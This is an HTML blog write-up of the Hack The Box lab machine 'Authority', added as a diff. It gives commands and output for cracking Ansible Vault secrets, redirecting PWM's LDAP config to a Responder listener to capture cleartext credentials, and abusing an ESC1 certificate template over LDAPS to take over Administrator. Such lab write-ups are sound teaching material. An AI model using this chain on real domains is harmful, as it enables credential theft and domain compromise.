@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HTB: Authority | Chaelsoo&#39;s blog</title>
+<meta property="og:title" content="HTB: Authority | Chaelsoo&#39;s blog" />
+<meta name="twitter:title" content="HTB: Authority | Chaelsoo&#39;s blog" />
+<meta itemprop="name" content="HTB: Authority | Chaelsoo&#39;s blog" />
+<meta name="application-name" content="HTB: Authority | Chaelsoo&#39;s blog" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="A Medium Windows box where cracking Ansible Vault files on a public share leads to a PWM portal. Redirecting its LDAP config to Responder gets cleartext creds, and ESC1 via LDAPS Schannel gets Domain Admin.">
+<meta itemprop="description" content="A Medium Windows box where cracking Ansible Vault files on a public share leads to a PWM portal. Redirecting its LDAP config to Responder gets cleartext creds, and ESC1 via LDAPS Schannel gets Domain Admin." />
+<meta property="og:description" content="A Medium Windows box where cracking Ansible Vault files on a public share leads to a PWM portal. Redirecting its LDAP config to Responder gets cleartext creds, and ESC1 via LDAPS Schannel gets Domain Admin." />
+<meta name="twitter:description" content="A Medium Windows box where cracking Ansible Vault files on a public share leads to a PWM portal. Redirecting its LDAP config to Responder gets cleartext creds, and ESC1 via LDAPS Schannel gets Domain Admin." />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+  <link rel="alternate" hreflang="en-gb" href="http://localhost:1313/writeups/htb-authority/" title="English" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.161.1">
+
+    
+    <meta property="og:url" content="http://localhost:1313/writeups/htb-authority/">
+  <meta property="og:site_name" content="Chaelsoo&#39;s blog">
+  <meta property="og:title" content="HTB: Authority">
+  <meta property="og:description" content="A Medium Windows box where cracking Ansible Vault files on a public share leads to a PWM portal. Redirecting its LDAP config to Responder gets cleartext creds, and ESC1 via LDAPS Schannel gets Domain Admin.">
+  <meta property="og:locale" content="en_gb">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2026-06-02T00:00:00+00:00">
+    <meta property="article:modified_time" content="2026-06-02T00:00:00+00:00">
+    <meta property="article:tag" content="Pwm">
+    <meta property="article:tag" content="Adcs">
+    <meta property="article:tag" content="Windows">
+
+
+    
+    
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB: Authority">
+  <meta name="twitter:description" content="A Medium Windows box where cracking Ansible Vault files on a public share leads to a PWM portal. Redirecting its LDAP config to Responder gets cleartext creds, and ESC1 via LDAPS Schannel gets Domain Admin.">
+
+
+    
+
+    <link rel="canonical" href="http://localhost:1313/writeups/htb-authority/">
+    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://localhost:1313/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+</head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.js"></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://localhost:1313/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/blogs/">
+                        Blogs
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/writeups/">
+                        Writeups
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="https://notes.chaelsoo.me">
+                        Cheatsheet
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HTB: Authority</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2026-06-02T00:00:00&#43;00:00" itemprop="datePublished"> 2 Jun 2026 </time>
+                </div>
+                
+            </header>
+            
+            <img src="/images/writeups/htb-authority/htb-authority-pwned.png" alt="HTB: Authority" style="width:100%;border-radius:0.5rem;margin:1.5rem 0;" />
+            
+            <div class="toc-container">
+    <button class="toc-toggle" type="button" onclick="toggleToc()">Table of Contents</button>
+    <div class="toc-content" id="tocContent">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a></li>
+    <li><a href="#ansible-vault-encrypted-credentials-on-an-anonymous-share">Ansible Vault: Encrypted Credentials on an Anonymous Share</a></li>
+    <li><a href="#pwm-making-the-server-reveal-its-ldap-password">PWM: Making the Server Reveal Its LDAP Password</a></li>
+    <li><a href="#adcs-esc1-enrollee-supplies-subject">ADCS ESC1: Enrollee Supplies Subject</a></li>
+    <li><a href="#when-pkinit-fails-the-schannel-alternative">When PKINIT Fails: The Schannel Alternative</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+<div class="mini-toc" id="miniToc">
+    <div class="mini-toc-header">
+        <div class="mini-toc-title">Contents</div>
+        <button class="mini-toc-minimize" type="button" onclick="toggleMiniToc()" aria-label="Minimize TOC">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M1 8a.5.5 0 0 1 .5-.5h13a.5.5 0 0 1 0 1h-13A.5.5 0 0 1 1 8zM7.646 4.146a.5.5 0 0 1 .708 0l2 2a.5.5 0 0 1-.708.708L8.5 5.707V11.5a.5.5 0 0 1-1 0V5.707L6.354 6.854a.5.5 0 1 1-.708-.708l2-2z"/>
+            </svg>
+        </button>
+    </div>
+    <div class="mini-toc-content" id="miniTocContent"></div>
+</div>
+            <div class="page-content">
+                <p>Windows box, Medium. The foothold here isn&rsquo;t a CVE or a spray. It&rsquo;s an Ansible deployment someone left readable on an SMB share with no credentials required. Three vault-encrypted credential blobs in the configs looked protected. They weren&rsquo;t, because all three used the same master password. Once you crack those, you land on a PWM service on port 8443: a self-service password management portal backed by an LDAP directory. The interesting part is that PWM&rsquo;s configuration file specifies which LDAP server to authenticate against. Change that URL to point at your own machine, upload the config back through the portal, and the service helpfully connects to your Responder listener using the LDAP service account in cleartext.</p>
+<p>The second half is ADCS: a CorpVPN template with ESC1 flags it right away. The catch is that the DC has PKINIT disabled. <code>certipy auth</code> fails with <code>KDC_ERR_PADATA_TYPE_NOSUPP</code>. The workaround took me a minute to understand: LDAP over TLS uses Schannel for its TLS handshake, which is completely independent of Kerberos. You can present your client certificate directly to port 636, get an LDAP shell as Administrator, and change the password from there.</p>
+<h2 id="recon">Recon</h2>
+<p>Standard AD fingerprint plus one non-standard port:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">53/tcp   open  domain         Simple DNS Plus
+</span></span><span class="line"><span class="cl">80/tcp   open  http           Microsoft IIS httpd 10.0
+</span></span><span class="line"><span class="cl">88/tcp   open  kerberos-sec
+</span></span><span class="line"><span class="cl">389/tcp  open  ldap           (Domain: authority.htb)
+</span></span><span class="line"><span class="cl">445/tcp  open  microsoft-ds
+</span></span><span class="line"><span class="cl">636/tcp  open  ssl/ldap
+</span></span><span class="line"><span class="cl">5985/tcp open  http           WinRM
+</span></span><span class="line"><span class="cl">8443/tcp open  ssl/http       Apache Tomcat
+</span></span></code></pre></div><p>No creds to start. Guest SMB was worth checking:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.129.229.56 -u <span class="s1">&#39;guest&#39;</span> -p <span class="s1">&#39;&#39;</span> --shares
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Development     READ
+</span></span><span class="line"><span class="cl">IPC$            READ            Remote IPC
+</span></span></code></pre></div><p>The Development share was readable without credentials. Pulled everything down with smbclient. What came out was a full Ansible deployment for an enterprise auth stack: ADCS role, LDAP role, PWM role.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Automation/
+</span></span><span class="line"><span class="cl">├── ADCS/
+</span></span><span class="line"><span class="cl">├── LDAP/
+</span></span><span class="line"><span class="cl">├── PWM/
+</span></span><span class="line"><span class="cl">│   ├── ansible_inventory
+</span></span><span class="line"><span class="cl">│   ├── defaults/main.yml
+</span></span><span class="line"><span class="cl">│   └── templates/tomcat-users.xml.j2
+</span></span><span class="line"><span class="cl">└── SHARE/
+</span></span></code></pre></div><h2 id="ansible-vault-encrypted-credentials-on-an-anonymous-share">Ansible Vault: Encrypted Credentials on an Anonymous Share</h2>
+<p><code>PWM/defaults/main.yml</code> had three vault-encrypted values:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">pwm_admin_login</span><span class="p">:</span><span class="w"> </span>!<span class="l">vault |</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">$ANSIBLE_VAULT;1.1;AES256</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="m">32666534386435366537653136663731633138616264323230383566333966346662313161326239</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="nt">pwm_admin_password</span><span class="p">:</span><span class="w"> </span>!<span class="l">vault |</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">$ANSIBLE_VAULT;1.1;AES256</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="m">31356338343963323063373435363261323563393235633365356134616261666433393263373736</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="nt">ldap_admin_password</span><span class="p">:</span><span class="w"> </span>!<span class="l">vault |</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">$ANSIBLE_VAULT;1.1;AES256</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="m">63303831303534303266356462373731393561313363313038376166336536666232626461653630</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="l">...</span><span class="w">
+</span></span></span></code></pre></div><p>Ansible Vault encrypts individual values using AES256, with a master password that&rsquo;s used as the key derivation input. The encrypted blobs are standalone, meaning you can extract them from a playbook and crack them offline without touching the live system. The master password is whatever the operator chose when they ran <code>ansible-vault encrypt</code>.</p>
+<p>The realistic assumption when someone stores vault-encrypted credentials in a shared repo is that they reused the same master password for convenience. If you crack one vault blob and find a key, try that key on all the others before doing more work.</p>
+<p>I extracted each encrypted block to its own file and ran john:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ansible2john vault1.txt vault2.txt vault3.txt &gt; all_vaults.hash
+</span></span><span class="line"><span class="cl">john all_vaults.hash --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">!@#$%^&amp;*         (vault2.txt)
+</span></span><span class="line"><span class="cl">!@#$%^&amp;*         (vault1.txt)
+</span></span><span class="line"><span class="cl">!@#$%^&amp;*         (vault3.txt)
+</span></span></code></pre></div><p>All three. Same password. Then decrypt each one:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ansible-vault decrypt vault1.txt --vault-password-file &lt;<span class="o">(</span><span class="nb">echo</span> <span class="s1">&#39;!@#$%^&amp;*&#39;</span><span class="o">)</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">vault1.txt → svc_pwm
+</span></span><span class="line"><span class="cl">vault2.txt → pWm_@dm!N_!23
+</span></span><span class="line"><span class="cl">vault3.txt → DevT3st@123
+</span></span></code></pre></div><p><code>ansible_inventory</code> also had <code>administrator:Welcome1</code> which didn&rsquo;t work against WinRM or SMB. The PWM credentials were the real find. The Tomcat template gave <code>admin:T0mc@tAdm1n</code> and <code>robot:T0mc@tR00t</code>, filed away for later.</p>
+<h2 id="pwm-making-the-server-reveal-its-ldap-password">PWM: Making the Server Reveal Its LDAP Password</h2>
+<p>Port 8443 was running PWM, a Java-based self-service password portal used by enterprises to let users reset their own passwords without calling helpdesk. It sits in front of Active Directory and connects to LDAP in the background using a proxy service account (here, <code>svc_ldap</code>).</p>
+<p>The Configuration Manager lives at <code>/pwm/private/config/login</code>. Logging in with <code>svc_pwm:pWm_@dm!N_!23</code>:</p>
+<p><img src="/images/writeups/htb-authority/pwm-config-login.png" alt="PWM Configuration Password login page at port 8443, showing previous authentication history with svc_pwm entries from authority.htb"></p>
+<p>Inside the Configuration Manager, there&rsquo;s a &ldquo;Download Configuration&rdquo; button that exports the current <code>PwmConfiguration.xml</code>:</p>
+<p><img src="/images/writeups/htb-authority/pwm-config-manager.png" alt="PWM Configuration Manager dashboard showing LDAP connection error warnings and Import/Download Configuration buttons"></p>
+<p>The downloaded config contained this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;setting</span> <span class="na">key=</span><span class="s">&#34;ldap.proxy.password&#34;</span> <span class="err">...</span> <span class="na">syntax=</span><span class="s">&#34;PASSWORD&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&lt;value&gt;</span>ENC-PW:gRNdPiTOczHjct11qrmQ/l126/F/iafrmKvKB1fu5miB5DfZH3sFMO7/KMOpjrYYTYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=<span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/setting&gt;</span>
+</span></span></code></pre></div><p>The LDAP proxy password is encrypted at rest, but that&rsquo;s not what we&rsquo;re going after. PWM decrypts it at runtime to authenticate against the LDAP server. The LDAP server URL is also in the config, and it&rsquo;s not encrypted.</p>
+<p>The attack: change the LDAP URL from <code>ldaps://authority.authority.htb:636</code> to a plain LDAP URL pointing at your Responder listener. Upload the modified config through the Import Configuration button. PWM reconnects to &ldquo;LDAP&rdquo;, which is now Responder, and sends svc_ldap&rsquo;s credentials as a cleartext LDAP simple bind.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sed <span class="s1">&#39;s|ldaps://authority.authority.htb:636|ldap://10.10.15.195:389|g&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  PwmConfiguration.xml &gt; PwmConfiguration_evil.xml
+</span></span></code></pre></div><p>Start Responder, upload the modified config, wait:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo responder -I tun0 -v
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[LDAP] Cleartext Client   : 10.129.229.56
+</span></span><span class="line"><span class="cl">[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
+</span></span><span class="line"><span class="cl">[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
+</span></span></code></pre></div><p><em>The reason you get cleartext here is that the original config used LDAPS (TLS-protected LDAP on 636), but the modified config uses plain LDAP on port 389. Plain LDAP simple bind sends the password in the clear. Responder captures it before it reaches any server.</em></p>
+<p>WinRM in as svc_ldap. User flag on the desktop.</p>
+<h2 id="adcs-esc1-enrollee-supplies-subject">ADCS ESC1: Enrollee Supplies Subject</h2>
+<p>certipy find as svc_ldap surfaced one vulnerable template:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="s2">&#34;Template Name&#34;</span><span class="err">:</span> <span class="s2">&#34;CorpVPN&#34;</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;Enrollee Supplies Subject&#34;</span><span class="err">:</span> <span class="kc">true</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;Client Authentication&#34;</span><span class="err">:</span> <span class="kc">true</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;Enrollment Rights&#34;</span><span class="err">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;AUTHORITY.HTB\\Domain Computers&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;AUTHORITY.HTB\\Domain Admins&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span><span class="err">,</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;[!] Vulnerabilities&#34;</span><span class="err">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;ESC1&#34;</span><span class="p">:</span> <span class="s2">&#34;Enrollee supplies subject and template allows client authentication.&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>ESC1 is the most straightforward ADCS misconfiguration: the template lets the requester specify whatever identity they want in the Subject Alternative Name. Normally a CA controls who a certificate says you are, and that control is what makes certificates useful for authentication. When &ldquo;Enrollee Supplies Subject&rdquo; is enabled, the CA surrenders that control. You request a certificate claiming to be <code>administrator@authority.htb</code>, and the CA signs it without verifying that claim.</p>
+<p>The catch: enrollment rights here belong to Domain Computers, not regular users. <code>svc_ldap</code> has <code>SeMachineAccountPrivilege</code>, which lets it add workstations to the domain. By default, any user on a domain can create up to 10 computer accounts (MachineAccountQuota). Creating a computer account gives you a principal with Domain Computers membership.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">addcomputer.py authority.htb/svc_ldap:<span class="s1">&#39;lDaP_1n_th3_cle4r!&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -computer-name <span class="s1">&#39;EVIL$&#39;</span> -computer-pass <span class="s1">&#39;EvilPass123!&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[*] Successfully added machine account EVIL$ with password EvilPass123!.
+</span></span></code></pre></div><p>Request the certificate:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy req -u <span class="s1">&#39;EVIL$@authority.htb&#39;</span> -p <span class="s1">&#39;EvilPass123!&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -dc-ip 10.129.229.56 <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -target authority.authority.htb <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -ca <span class="s1">&#39;AUTHORITY-CA&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -template CorpVPN <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -upn administrator@authority.htb
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[*] Got certificate with UPN &#39;administrator@authority.htb&#39;
+</span></span><span class="line"><span class="cl">[*] Certificate has no object SID
+</span></span><span class="line"><span class="cl">[*] Saving certificate and private key to &#39;administrator.pfx&#39;
+</span></span></code></pre></div><p>Certificate issued. Now try to authenticate:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy auth -pfx administrator.pfx -dc-ip 10.129.229.56
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[-] Got error while trying to request TGT: Kerberos SessionError: 
+</span></span><span class="line"><span class="cl">    KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
+</span></span></code></pre></div><h2 id="when-pkinit-fails-the-schannel-alternative">When PKINIT Fails: The Schannel Alternative</h2>
+<p><code>KDC_ERR_PADATA_TYPE_NOSUPP</code> means the DC doesn&rsquo;t support PKINIT, the Kerberos extension that lets you exchange a certificate for a TGT. Without PKINIT, the standard <code>certipy auth</code> flow is dead.</p>
+<p>But there&rsquo;s another way to use a client certificate for authentication that has nothing to do with Kerberos: LDAP over TLS on port 636 (LDAPS).</p>
+<p>The relevant difference is in how authentication works at each layer:</p>
+<p>When you do PKINIT, you&rsquo;re asking Kerberos to process your certificate as a credential and issue a TGT. That requires the KDC to actively support the PKINIT pre-authentication method.</p>
+<p>When you do LDAPS, the TLS handshake is handled by Schannel, Windows&rsquo; native TLS implementation. During the handshake, if you present a client certificate, the server verifies it against trusted CAs (this DC trusts its own CA, which signed our certificate) and against the SAN (which says <code>administrator@authority.htb</code>). If both checks pass, Schannel considers you authenticated as that principal. Kerberos never enters the picture. The DC resolves <code>administrator@authority.htb</code> to the Administrator AD account and grants you LDAP access as that account.</p>
+<p>certipy has a <code>-ldap-shell</code> flag that does exactly this:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">certipy auth -pfx administrator.pfx -dc-ip 10.129.229.56 -ldap-shell
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[*] Connecting to &#39;ldaps://10.129.229.56:636&#39;
+</span></span><span class="line"><span class="cl">[*] Authenticated to &#39;10.129.229.56&#39; as: &#39;u:HTB\\Administrator&#39;
+</span></span><span class="line"><span class="cl">Type help for list of commands
+</span></span></code></pre></div><p>From the LDAP shell you can run directory operations as Administrator. The simplest finish is changing the Administrator password:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># change_password administrator &#39;Pwn3d!Kanyo123!&#39;</span>
+</span></span></code></pre></div><p>Then WinRM in with the new password. Root flag.</p>
+<p>The PKINIT bypass via LDAPS is something that doesn&rsquo;t appear in many writeups because most DCs do have PKINIT configured. When you hit a box where <code>certipy auth</code> fails with <code>KDC_ERR_PADATA_TYPE_NOSUPP</code>, reach for <code>-ldap-shell</code> before writing off the ESC1 certificate as useless.</p>
+
+            </div>
+        </article></main>
+</div>
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+        if (!content || !button) return;
+        content.classList.toggle('expanded');
+        button.classList.toggle('expanded');
+    }
+
+    function toggleMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        if (miniToc) miniToc.classList.toggle('minimized');
+    }
+
+    function setupActiveHighlighting(links) {
+        const targets = Array.from(links).map(link => {
+            const href = link.getAttribute('href');
+            if (href && href.startsWith('#')) {
+                const el = document.getElementById(decodeURIComponent(href.slice(1)));
+                if (el) return { link, element: el };
+            }
+            return null;
+        }).filter(Boolean);
+
+        if (targets.length === 0) return;
+
+        function update() {
+            const scrollPosition = window.scrollY + 100;
+            let active = null;
+            targets.forEach(t => {
+                if (t.element.offsetTop <= scrollPosition) active = t;
+            });
+            links.forEach(l => l.classList.remove('active'));
+            if (active) active.link.classList.add('active');
+        }
+
+        let ticking = false;
+        window.addEventListener('scroll', () => {
+            if (!ticking) {
+                requestAnimationFrame(() => { update(); ticking = false; });
+                ticking = true;
+            }
+        });
+        update();
+    }
+
+    function initMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        const miniTocContent = document.getElementById('miniTocContent');
+        const sourceToc = document.getElementById('tocContent');
+        if (!miniToc || !miniTocContent || !sourceToc) return;
+
+        const clone = sourceToc.cloneNode(true);
+        clone.classList.remove('toc-content', 'expanded');
+        clone.removeAttribute('id');
+
+        const links = clone.querySelectorAll('a');
+        if (links.length === 0) return;
+
+        links.forEach(link => {
+            link.addEventListener('click', (e) => {
+                const href = link.getAttribute('href');
+                if (href && href.startsWith('#')) {
+                    const target = document.getElementById(decodeURIComponent(href.slice(1)));
+                    if (target) {
+                        e.preventDefault();
+                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                        history.pushState(null, '', href);
+                    }
+                }
+            });
+        });
+
+        miniTocContent.appendChild(clone);
+        miniToc.classList.add('visible');
+        setupActiveHighlighting(links);
+    }
+
+    document.addEventListener('DOMContentLoaded', initMiniToc);
+</script>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://discord.com/users/kanyo._" target="_blank" rel="noopener noreferrer me"
+    title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
+    <path
